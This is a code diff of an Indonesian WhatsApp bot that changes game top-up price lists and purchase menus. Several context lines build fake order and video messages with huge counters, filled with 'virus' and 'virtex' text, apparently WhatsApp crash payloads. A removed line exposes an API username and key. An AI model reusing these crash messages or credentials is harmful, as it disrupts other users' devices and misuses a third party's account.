@@ -51,564 +51,6 @@ users: {},
 chats: {},
 ...(global.db || {})
 }
-let list = {
-  "ff": {
-    "FF5": {
-    "nama": "5 Diamond",
-    "hargaid": 900,
-    "harga":"Rp900",
-    },
-        "FF10": {
-    "nama": "10 Diamond",
-    "hargaid": 1800,
-    "harga":"Rp1.800",
-    },
-        "FF15": {
-    "nama": "15 Diamond",
-    "hargaid": 2700,
-    "harga":"Rp2.700",
-    },
-        "FF20": {
-    "nama": "20 Diamond",
-    "hargaid": 3000,
-    "harga":"Rp3.000",
-    },
-        "FF25": {
-    "nama": "25 Diamond",
-    "hargaid": 3900,
-    "harga":"Rp3.900",
-    },
-        "FF30": {
-    "nama": "30 Diamond",
-    "hargaid": 4800,
-    "harga":"Rp4.800",
-    },
-        "FF40": {
-    "nama": "40 Diamond",
-    "hargaid": 6000,
-    "harga":"Rp6.000",
-    },
-        "FF50": {
-    "nama": "50 Diamond",
-    "hargaid": 7200,
-    "harga":"Rp7.200",
-    },
-        "FF55": {
-    "nama": "55 Diamond",
-    "hargaid": 8100,
-    "harga":"Rp8.100",
-    },
-        "FF60": {
-    "nama": "60 Diamond",
-    "hargaid": 9000,
-    "harga":"Rp9.000",
-    },
-        "FF70": {
-    "nama": "70 Diamond",
-    "hargaid": 9900,
-    "harga":"Rp9.900",
-    },
-        "FF75": {
-    "nama": "75 Diamond",
-    "hargaid": 10800,
-    "harga":"Rp10.800",
-    },
-"FF80": {
-"nama": "80 Diamond",	
-"hargaid":11700,
-"harga":"Rp11.700",
-},
-"FF90": {
-"nama": "90 Diamond",	
-"hargaid":12900,
-"harga":"Rp12.900",
-},
-"FF95": {
-"nama": "95 Diamond",	
-"hargaid":13800,
-"harga":"Rp13.800",	
-},
-"FF100": {
-"nama": "100 Diamond",	
-"hargaid": 14400,
-"harga":"Rp14.400",
-},
-"FF120": {
-"nama": "120 Diamond",	
-"hargaid":17100,
-"harga":"Rp17.100",
-},
-"FF130": {
-"nama": "130 Diamond",	
-"hargaid":18900,
-"harga":"Rp18.900",
-},
-"FF140": {
-"nama": "140 Diamond",	
-"hargaid":19800,
-"harga":"Rp19.800",	
-},
-"FF145": {
-"nama": "145 Diamond",	
-"hargaid":20700,
-"harga":"Rp20.700",
-},
-"FF150": {
-"nama": "150 Diamond",	
-"hargaid":21600,
-"harga":"Rp21.600",
-},
-"FF160": {
-"nama": "160 Diamond",	
-"hargaid":22800,
-"harga":"Rp22.800",
-},
-"FF180": {
-"nama": "180 Diamond",	
-"hargaid":25800,
-"harga":"Rp25.800",
-},
-"FF190": {
-"nama": "190 Diamond",	
-"hargaid":27000,
-"harga":"Rp27.000",
-},
-"FF200": {
-"nama": "200 Diamond",	
-"hargaid":28800,
-"harga":"Rp28.800",
-},
-"FF210": {
-"nama": "210 Diamond",	
-"hargaid":29700,
-"harga":"Rp29.700",
-},
-"FFM": {
-"nama": "Member Mingguan",
-"hargaid":30000,
-"harga":"Rp30.000",
-},
-"FF250": {
-"nama": "250 Diamond",	
-"hargaid":35700,
-"harga":"Rp35.700",
-},
-"FF280": {
-"nama": "280 Diamond",	
-"hargaid":39600,
-"harga":"Rp39.600",
-},
-"FF300": {
-"nama": "300 Diamond",	
-"hargaid":42600,
-"harga":"Rp42.600",
-},
-"FF355": {
-"nama": "355 Diamond",	
-"hargaid":49900,
-"harga":"Rp49.900",
-},
-"FF350": {
-"nama": "350 Diamond",	
-"hargaid":49500,
-"harga":"Rp49.500",
-},
-"FF375": {
-"nama": "375 Diamond",	
-"hargaid":52500,
-"harga":"Rp52.500",
-},
-"FF400": {
-"nama": "400 Diamond",	
-"hargaid":56400,
-"harga":"Rp56.400",
-},
-"FF405": {
-"nama": "405 Diamond",	
-"hargaid":56700,
-"harga":"Rp56.700",
-},
-"FF425": {
-"nama": "425 Diamond",	
-"hargaid":59400,
-"harga":"Rp59.400",
-},
-"FF475": {
-"nama": "475 Diamond",	
-"hargaid":66600,
-"harga":"Rp66.600",
-},
-"FF500": {
-"nama": "500 Diamond",	
-"hargaid":70200,
-"harga":"Rp70.200",
-},
-"FF510": {
-"nama": "510 Diamond",	
-"hargaid": 72000,
-"harga":"Rp72.000",
-},
-"FF515": {
-"nama": "515 Diamond",	
-"hargaid": 72300,
-"harga":"Rp72.300",
-},
-
-"FF512": {
-"nama": "512+3 Diamond",	
-"hargaid":72300,
-"harga":"Rp72.300",
-},
-"FF545": {
-"nama": "545 Diamond",	
-"hargaid":76500,
-"harga":"Rp76.500",
-},
-"FF565": {
-"nama": "565 Diamond",	
-"hargaid":79200,
-"harga":"Rp79.200",	
-},
-"FF600": {
-"nama": "600 Diamond",	
-"hargaid":84600,
-"harga":"Rp84.600",
-},
-"FF635": {
-"nama": "635 Diamond",	
-"hargaid": 89100,
-"harga":"Rp89.100",
-},
-"FF645": {
-"nama": "645 Diamond",	
-"hargaid":90900,
-"harga":"Rp90.900",
-},
-"FF655": {
-"nama": "655 Diamond",	
-"hargaid":92100,
-"harga":"Rp92.100",
-},
-"FF720": {
-"nama": "720 Diamond",	
-"hargaid": 99000,
-"harga":"Rp99.000",
-},
-"FF700": {
-"nama": "700 Diamond",	
-"hargaid":99000,
-"harga":"Rp99.000",
-},
-"FF770": {
-"nama": "770 Diamond",	
-"hargaid":106200,
-"harga":"Rp106.200",	
-},
-"FF790": {
-"nama": "790 Diamond",	
-"hargaid": 108900,
-"harga":"Rp108.900",
-},
-"FF800": {
-"nama": "800 Diamond",	
-"hargaid": 110700,
-"harga":"Rp110.700",
-},
-"FF860": {
-"nama": "860 Diamond",	
-"hargaid": 118800,
-"harga":"Rp118.800",
-},
-"FF930": {
-"nama": "930 Diamond",	
-"hargaid":128700,
-"harga":"Rp128.700",
-},
-"FF1000": {
-"nama": "1000 Diamond",	
-"hargaid":138600,
-"harga":"Rp138.600",	
-},
-"FF1050": {
-"nama": "1050 Diamond",	
-"hargaid":145800,
-"harga":"Rp145.800",
-},
-"FF1075": {
-"nama": "1075 Diamond",	
-"hargaid":148500,
-"harga":"Rp148.500",
-},
-"FF1080": {
-"nama": "1080 Diamond",	
-"hargaid":149400,
-"harga":"Rp149.400",
-},
-"FFB": {
-"nama": "Member Bulanan",
-"hargaid":150000,
-"harga":"Rp150.000",
-},
-"FF1200": {
-"nama": "1200 Diamond",	
-"hargaid":166800,
-"harga":"Rp166.800",
-},
-"FF1215": {
-"nama": "1215 Diamond",	
-"hargaid":16830,
-"harga":"Rp168.300",
-},
-"FF1300": {
-"nama": "1300 Diamond",	
-"hargaid":180900,
-"harga":"Rp180.900",
-},
-"FF1440": {
-"nama": "1440 Diamond",	
-"hargaid":198000,
-"harga":"Rp198.000",
-},
-"FF1450": {
-"nama": "1450 Diamond",	
-"hargaid":199800,
-"harga":"Rp199.800",
-},
-"FF1490": {
-"nama": "1490 Diamond",	
-"hargaid":205200,
-"harga":"Rp205.200",
-},
-"FF1510": {
-"nama": "1510 Diamond",	
-"hargaid":207900,
-"harga":"Rp207.900",
-},
-"FF1580": {
-"nama": "1580 Diamond",	
-"hargaid":217800,
-"harga":"Rp217.800",
-},
-"FF1795": {
-"nama": "1795 Diamond",	
-"hargaid":247500,
-"harga":"Rp247.500",
-},
-"FF1800": {
-"nama": "1800, Diamond",	
-"hargaid": 248400,
-"harga":"Rp248.400",
-},
-"FF2000": {
-"nama": "2000 Diamond",	
-"hargaid":270000,
-"harga":"Rp270.000",
-},
-"FF2140": {
-"nama": "2140 Diamond",	
-"hargaid": 289800,
-"harga":"Rp289.800",
-},
-"FF2190": {
-"nama": "2190 Diamond",	
-"hargaid": 297000,
-"harga":"Rp297.000",
-},
-"FF2210": {
-"nama": "2210 Diamond",	
-"hargaid": 299700,
-"harga":"Rp299.700",
-},
-"FF2280": {
-"nama": "2280 Diamond",	
-"hargaid": 309600,
-"harga":"Rp309.600",
-},
-"FF2355": {
-"nama": "2355 Diamond",	
-"hargaid": 319500,
-"harga":"Rp319.500",
-},
-"FF2720": {
-"nama": "2720 Diamond",	
-"hargaid": 369000,
-"harga":"Rp369.000",
-},
-"FF4000": {
-"nama": "4000 Diamond",	
-"hargaid": 540000,
-"harga":"Rp540.000",
-},
-"FF77290": {
-"nama": "7290 Diamond",	
-"hargaid": 990000,
-"harga":"Rp990.000",
-},
-},
-};
-let listml = {
-  "ml": {
-    "UPMBL5": {
-    "nama": "5 Diamond",
-    "hargaid": 1700,
-    "harga":"Rp1.700",
-    },
-        "UPMBL12": {
-    "nama": "12 Diamond",
-    "hargaid": 4000,
-    "harga":"Rp4.000",
-    },
-    "ZIDMBL17": {
-    "nama": "17 Diamond",
-    "hargaid": 4500,
-    "harga":"Rp4.500",
-    },
-        "UPMBL19": {
-    "nama": "19 Diamond",
-    "hargaid": 7000,
-    "harga":"Rp7.000",
-    },
-        "UPMBL28": {
-    "nama": "28 Diamond",
-    "hargaid": 10500,
-    "harga":"Rp10.500",
-    },
-        "UPMBL36": {
-    "nama": "36 Diamond",
-    "hargaid": 13000,
-    "harga":"Rp13.000",
-    },
-        "UPMBL44": {
-    "nama": "44 Diamond",
-    "hargaid": 15000,
-    "harga":"Rp15.000",
-    },
-        "UPMBL59": {
-    "nama": "59 Diamond",
-    "hargaid": 18500,
-    "harga":"Rp18.500",
-    },
-        "UPMBL74": {
-    "nama": "74 Diamond",
-    "hargaid": 22500,
-    "harga":"Rp22.500",
-    },
-        "UPMBL85": {
-    "nama": "85 Diamond",
-    "hargaid": 26500,
-    "harga":"Rp26.500",
-    },
-        "UPMBL170": {
-    "nama": "170 Diamond",
-    "hargaid": 51500,
-    "harga":"Rp51.500",
-    },
-        "UPMBL185": {
-    "nama": "185 Diamond",
-    "hargaid": 56500,
-    "harga":"Rp56.500",
-    },
-        "UPMBL222": {
-    "nama": "222 Diamond",
-    "hargaid": 67500,
-    "harga":"Rp67.500",
-    },
-        "UPMBL240": {
-    "nama": "240 Diamond",
-    "hargaid": 72500,
-    "harga":"Rp72.500",
-    },
-        "UPMBL296": {
-    "nama": "296 Diamond",
-    "hargaid": 89500,
-    "harga":"Rp89.500",
-    },
-        "UPMBL370": {
-    "nama": "370 Diamond",
-    "hargaid": 111500,
-    "harga":"Rp111.500",
-    },
-        "UPMBL408": {
-    "nama": "408 Diamond",
-    "hargaid": 123500,
-    "harga":"Rp123.500",
-    },
-        "UPMBL568": {
-    "nama": "568 Diamond",
-    "hargaid": 167500,
-    "harga":"Rp167.500",
-    },
-        "UPMBL875": {
-    "nama": "875 Diamond",
-    "hargaid": 256500,
-    "harga":"Rp256.500",
-    },
-        "UPMBL1159": {
-    "nama": "1159 Diamond",
-    "hargaid": 333500,
-    "harga":"Rp333.500",
-    },
-        "UPMBL2010": {
-    "nama": "2010 Diamond",
-    "hargaid": 555.500,
-    "harga":"Rp555.500",
-    },
-        "UPMBL4830": {
-    "nama": "4830 Diamond",
-    "hargaid": 1322500,
-    "harga":"Rp1322.500",
-    },
- },
-};
-let listmlbb = {
-  "ml": {
-    "ZIDMBL17": {
-    "nama": "17 Diamond",
-    "hargaid": 4500,
-    "harga":"Rp4.500",
-    },
-        "ZIDMBL34": {
-    "nama": "34 Diamond",
-    "hargaid": 9000,
-    "harga":"Rp9.000",
-    },
-    "ZIDMBL50": {
-    "nama": "50 Diamond",
-    "hargaid": 13500,
-    "harga":"Rp13.500",
-    },
-        "ZIDMBL66": {
-    "nama": "66 Diamond",
-    "hargaid": 18000,
-    "harga":"Rp18.000",
-    },
-        "ZIDMBL74": {
-    "nama": "74 Diamond",
-    "hargaid": 20000,
-    "harga":"Rp20.000",
-    },
-        "ZIDMBL83": {
-    "nama": "83 Diamond",
-    "hargaid": 22500,
-    "harga":"Rp22.500",
-    },
-        "ZIDMBL184": {
-    "nama": "184 Diamond",
-    "hargaid": 5000,
-    "harga":"Rp50.000",
-    },
-        "ZIDMBL366": {
-    "nama": "366 Diamond",
-    "hargaid": 100000,
-    "harga":"Rp100.000",
-    },
-        "ZIDMBL758": {
-    "nama": "758 Diamond",
-    "hargaid": 200000,
-    "harga":"Rp200.000",
-    },
- },
-}
 
 module.exports = baymax = async (baymax, m, chatUpdate, store) => {
 try {
@@ -789,11 +231,11 @@ baymax.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author:
 }
 
 try {
-ppuser = await baymax.profilePictureUrl(m.sender, 'image')
+ppimg = await baymax.profilePictureUrl(m.sender, 'image')
 } catch (err) {
-ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
+ppimg = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
 }
-ppnyauser = await reSize(ppuser, 300, 300)
+ppnyaimg = await reSize(ppimg, 300, 300)
 
 const sendvn = (teks) => {
 baymax.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
@@ -816,7 +258,7 @@ message: {
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `baymax Bot WhatsApp`, 
-"jpegThumbnail": ppnyauser
+"jpegThumbnail": ppnyaimg
 }
 }
 }
@@ -831,7 +273,7 @@ message: {
 extendedTextMessage: { 
 text: `${m.pushName}`, 
 title: `${m.pushName}`, 
-jpegThumbnail: ppnyauser } } }
+jpegThumbnail: ppnyaimg } } }
 
 const troli = {
 key: {
@@ -846,7 +288,7 @@ status: 99999999999999999999,
 surface : 9999999999999999,
 message: virus,
 orderTitle: virus,
-thumbnail: ppnyauser,
+thumbnail: ppnyaimg,
 sellerJid: '0@s.whatsapp.net'
 },
 },
@@ -982,7 +424,7 @@ participant: `0@s.whatsapp.net`,
 'duration': '99999', 
 'gifPlayback': 'true', 
 'caption': `${virus}${virtex(prefix)}`,
-'jpegThumbnail': ppnyauser
+'jpegThumbnail': ppnyaimg
 }}}
 
 const vien = {
@@ -994,7 +436,7 @@ participant: `0@s.whatsapp.net`,
 "message": {
 "orderMessage": {
 "orderId": "594071395007984",
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
@@ -1091,7 +533,7 @@ const butlocNye = [
 {buttonId: `${prefix}topupff`, buttonText: {displayText: '𝗧𝗢𝗣𝗨𝗣'}, type: 1}
 ]
 const buttonLocnya = {
-location: { jpegThumbnail: ppnyauser } ,
+location: { jpegThumbnail: ppnyaimg } ,
 caption: `Hai Kak @${sender.split("@")[0]} 
 𝘏𝘢𝘪 𝘚𝘢𝘺𝘢 𝘉𝘈𝘠𝘔𝘈𝘟 𝘠𝘢𝘪𝘵𝘶 𝘉𝘰𝘵 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘈𝘯𝘥𝘢 𝘒𝘦𝘵𝘪𝘬 #𝘈𝘓𝘓𝘮𝘦𝘯𝘶 𝘜𝘯𝘵𝘶𝘬 𝘔𝘦𝘯𝘢𝘮𝘱𝘪𝘭𝘬𝘢𝘯 𝘚𝘦𝘮𝘶𝘢 𝘔𝘦𝘯𝘶,
 Nama ${itsMebaymax ? 'Owner' : 'User'} : ${pushname}
@@ -1545,7 +987,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1564,7 +1006,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1584,7 +1026,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1603,7 +1045,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1622,7 +1064,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1641,7 +1083,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1660,7 +1102,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1679,7 +1121,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1698,7 +1140,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1717,7 +1159,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -2302,7 +1744,7 @@ baymax.sendMessage(m.chat,{
 image:{
 url:kay.thumb_nya},
 caption:dty,
-jpegThumbnail: ppnyauser},
+jpegThumbnail: ppnyaimg},
 {quoted:m})
 }
 break
@@ -2409,148 +1851,189 @@ baymax.sendMessage(from,{image:qrisdonate, caption:`Hai Kak @${sender.split("@")
 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛.`, mentions: [sender]},{quoted:m})
 }
 break
-case 'ovo':{
-if (isGroup) return reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
-let noshp = text
-if (isNaN(parseInt(noshp))) return reply(`${command} 6285737134572`)
-const sections = [
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp20.000", rowId: `${prefix}cvspay ${noshp}|11`}
-	]
-    },
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp25.000", rowId: `${prefix}cvspay ${noshp}|12`}
-	]
-    },
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp30.000", rowId: `${prefix}cvspay ${noshp}|13`}
-	]
-    },
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp40.000", rowId: `${prefix}cvspay ${noshp}|14`}
-	]
-    },
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp50.000", rowId: `${prefix}cvspay ${noshp}|15`}
-	]
-    },
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp60.000", rowId: `${prefix}cvspay ${noshp}|16`}
-	]
-    },
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp70.000", rowId: `${prefix}cvspay ${noshp}|17`}
-	]
-    },
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp75.000", rowId: `${prefix}cvspay ${noshp}|18`}
-	]
-    },
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp90.000", rowId: `${prefix}cvspay ${noshp}|19`}
-	]
-    },
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp100.000", rowId: `${prefix}cvspay ${noshp}|20`}
-	]
-    },
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp125.000", rowId: `${prefix}cvspay ${noshp}|21`}
-	]
-    },
-     {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp150.000", rowId: `${prefix}cvspay ${noshp}|22`}
-	]
-    },
-    {
-	title: `Convert Ovo`,
-	rows: [
-	    {title: "Rp200.000", rowId: `${prefix}cvspay ${noshp}|22`}
-	]
-    },
+case 'topupff': case 'topupml': case 'topupsaldo':{
+const seactiones = [
+{
+title: `LIST TOPUP FREEFIRE`,
+rows: [
+{title: `50 DIAMOND = 10k`, rowId: `${prefix}topupff 50`},
+{title: `70 DIAMOND = 13K`, rowId: `${prefix}topupff 70`},
+{title: `100 DIAMOND = 16K`, rowId: `${prefix}topupff 100`},
+{title: `140 DIAMOND = 21K`, rowId: `${prefix}topupff 140`},
 ]
-let isian = `    
-Silahkan Pilih Nominal Saldo E-wallet Yang Akan Anda Convert Ke Ovo!.
-
-Note: Pembayaran Disini Hanya Menggunakan Server, Owner Tidak Mendapatkan Hasil Apapun Disini Karena Diproses Langsung Dari Server!.
-
-Jika Sudah Melakukan Pemilihan Nominal, Anda Akan Dikirimkan Qris Pembayaran Dan Anda Harus Membayar Melalu Aplikasi E-wallet Yang Mendukung Qris, Pastikan Nominal Yang Anda Krimkan Harus Sama Dengan Nominal Yang Diminta!.
-
-Jika Anda Sudah Melakukan Pembayaran, Silahkan Tunggu 1-2 Menit Dan Melakukan Pengecekan Secara Berkala Pada Saldo Anda!.`
-const listMessage = {
-  text: isian,
-  footer: "Powered By @Aryabaymax",
-  title: "━━[ Nominal saldo Ovo ]━━",
-  buttonText: "Klik Disini",
-  sections
+},
+{
+title: `LIST PREMIUM`,
+rows: [
+{title: `1 MINGGU`, rowId: `${prefix}premkay 1minggu`},
+{title: `1 BULAN`, rowId: `${prefix}premkay 1bulan`},
+{title: `1 TAHUN`, rowId: `${prefix}premkay 1tahun`},
+{title: `PERMANENT`, rowId: `${prefix}premkay permanent`},
+]
+},
+{
+title: `LIST JADI OWNER`,
+rows: [
+{title: `1 MINGGU`, rowId: `${prefix}ownkay 1minggu`},
+{title: `1 BULAN`, rowId: `${prefix}ownkay 1bulan`},
+{title: `1 TAHUN`, rowId: `${prefix}ownkay 1tahun`},
+{title: `PERMANENT`, rowId: `${prefix}ownkay permanent`},
+]
 }
-const tessgh = await baymax.sendMessage(from, listMessage)
-break
-}
-case 'cvspay':{
-if (isGroup) return reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
-let idff = text.split("|")[0]
-let produkid = text.split("|")[1]
-let cvnya = await convertSaldo(`${produkid}`, `${idff}`)
-let byr = `*─ 「 CEK TRANSAKSIMU 」 ─*
-     
-_Berikut Adalah Transaksi Anda_
-_》Saldo : ${cvnya.product}_
-_》No Tujuan : ${idff}_
-_》Total Tagihan : ${cvnya.tagihan}_
-_》Id Trx : ${cvnya.order_id}_
-
-Silahkan Scan Qris Diatas Untuk Melakukan Pembayaran
-Saldo Akan Masuk Otomatis Dalam Waktu 1-5 Menit Setelah Melakukan Pembayaran!.`
-baymax.sendMessage(m.chat, { image: { url: cvnya.img }, caption: `${byr}` }, { quoted: m })
+]
+const listSw = { 
+text: `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}`,
+mentions: [sender],
+footer: `Mau ${command} ya? Silahkan Pilih Di Bawah Ini`,
+buttonText: 'TOPUP',
+sections: seactiones,
+listType: 1}
+baymax.sendMessage(from, listSw, { quoted: m })
 }
 break
-case 'buypulsa':
-let dokid = text.split("|")[0]
-let cusid = text.split("|")[1]
-if (isNaN(parseInt(cusid))) return reply('Nomor Hp Harus Berupa Angka!')
-
-let anuni = await fetchJson(`https://trendtoday.my.id/api/transaction?username=manik729828YWOD&apikey=lq7ae3b7j6n0wgrz5arcqdh0c5o7cx&product=pulsa&nominal=${dokid}&id_costumer=${cusid}`)
-let suksess = `*─ 「 LANJUTKAN PEMBAYARAN 」 ─*
-                
-_Silahkan Scan Qris Dan Transfer Sesuai Harga:_
-_》Harga : Rp${anuni.amount}_
-_》Provider : ${anuni.provider}_
-_》Nomor : ${cusid} ( Pulsa )_
-_》Code Trx : ${anuni.transaction_id}_
-
-_Qr Scan Berlaku 5 Menit, Setelah 5 Menit Pesan Ini Akan Dihapus!._  
-
-_Note: Pulsa Akan Otomatis Masuk Setelah Pembayaran Berhasil._`
-let inina = await baymax.sendMessage(m.chat, { image: { url: anuni.qr_payment }, caption: `${suksess}` }, { quoted: m })
-setTimeout(() => {
-baymax.sendMessage(from, { delete:inina.key })
-}, 500000)
+case 'topupff': case 'topupml': case 'topuppubg':{
+const seactiones = [
+{
+title: `LIST TOPUP FF`,
+rows: [
+{title: `50 DIAMOND = 10k`, rowId: `${prefix}sewakay 1minggu`},
+{title: `70 DIAMOND = 13K`, rowId: `${prefix}sewakay 1bulan`},
+{title: `100 DIAMOND = 16K`, rowId: `${prefix}sewakay 1tahun`},
+{title: `140 DIAMOND = 21K`, rowId: `${prefix}sewakay permanent`},
+]
+},
+{
+title: `LIST PREMIUM`,
+rows: [
+{title: `1 MINGGU`, rowId: `${prefix}premkay 1minggu`},
+{title: `1 BULAN`, rowId: `${prefix}premkay 1bulan`},
+{title: `1 TAHUN`, rowId: `${prefix}premkay 1tahun`},
+{title: `PERMANENT`, rowId: `${prefix}premkay permanent`},
+]
+},
+{
+title: `LIST JADI OWNER`,
+rows: [
+{title: `1 MINGGU`, rowId: `${prefix}ownkay 1minggu`},
+{title: `1 BULAN`, rowId: `${prefix}ownkay 1bulan`},
+{title: `1 TAHUN`, rowId: `${prefix}ownkay 1tahun`},
+{title: `PERMANENT`, rowId: `${prefix}ownkay permanent`},
+]
+}
+]
+const listSw = { 
+text: `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}`,
+mentions: [sender],
+footer: `Mau ${command} ya? Silahkan Pencet Di Bawah Ya Kak`,
+buttonText: 'SELECT',
+sections: seactiones,
+listType: 1}
+baymax.sendMessage(from, listSw, { quoted: m })
+}
 break
+case 'sewakay':
+if ((args[0]) == '1minggu'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*鉂? ORDER 鉂?*
+馃摦 : *Paket:* 50 Diamond FreeFire 鈥? Ada Yang Mau Buy Diamond
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == '1bulan'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*鉂? ORDER 鉂?*
+馃摦 : *Paket:* 70 Diamond FreeFire 鈥? Ada Yang Buy Diamond
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == '1tahun'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*鉂? ORDER 鉂?*
+  : *Paket:* 100 Diamond Freefire 鈥? Ada Yang Buy Diamond
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == 'permanent'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*鉂? ORDER 鉂?*
+📮 : *Paket:* 140 Diamond Freefire 鈥? Ada Yang Buy Diamond
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+}
+break
+case 'premkay':
+if ((args[0]) == '1minggu'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 10K �? Premium 1 Minggu
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == '1bulan'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 20K �? Premium 1 Bulan
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == '1tahun'){
